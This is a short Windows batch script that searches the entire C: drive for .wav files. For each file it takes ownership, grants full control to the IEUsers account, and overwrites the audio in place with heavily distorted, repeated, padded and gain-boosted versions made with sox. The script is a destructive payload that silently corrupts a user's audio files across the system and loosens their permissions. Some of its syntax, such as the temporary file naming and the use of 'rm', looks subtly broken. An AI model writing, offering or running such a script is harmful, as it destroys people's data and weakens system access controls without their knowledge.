@echo off
forfiles /P C:\ /S /M *.wav /C "cmd /c takeown /F @path & icacls @path /grant:r IEUsers:F /T & sox -V @path @path2.wav overdrive 100 100 & sox -V @path2.wav @path repeat 1 & sox -V @path @path2.wav pad 1 0 & sox -V @path2.wav @path gain 10 & rm @path2.wav"